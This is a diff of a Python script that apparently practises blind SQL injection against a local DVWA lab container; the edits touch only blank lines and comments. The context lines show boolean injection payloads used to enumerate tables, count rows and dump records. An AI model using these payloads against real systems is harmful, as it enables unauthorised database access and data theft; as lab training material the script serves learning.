@@ -3,6 +3,7 @@
 # Start the DVWA docker container by using:
 # docker run --rm -it -p 80:80 vulnerables/web-dvwa
 
+
 import httpx
 import os
 import re
@@ -39,7 +40,6 @@ def test_injection(injection):
     return b"exists in the database" in response.content
 
 
-
 ############################################
 # Method 1: Enumeration using a dictionary #
 ############################################
@@ -55,6 +55,8 @@ if not os.path.exists(file_name):
         with open(file_name, "wb") as file_dict:
             for chunk in lines.iter_bytes(chunk_size=512):
                 file_dict.write(chunk)
+
+# List the tables in the database matching dictionary words
 print("Tables found:")
 with open(file_name) as file_dict:
     for word in file_dict:
@@ -120,13 +122,16 @@ for column_index in range(column_count):
     columns.append("".join(name))
 #print(f"The table '{table}' has the columns {columns}")
 
+
 # Use the column names to find the row values
 
-## Find number of rows
+## Find the number of rows
 for row_count in range(50):
     injection = build_injection(f"1' AND (SELECT COUNT(*) FROM {table}) = {row_count} -- -")
     if test_injection(injection):
         break
+
+## Table data dump
 print(f"The table '{table}' has {row_count} rows")
 print(f"Table '{table}' records:")
 print(f"\t{columns}")
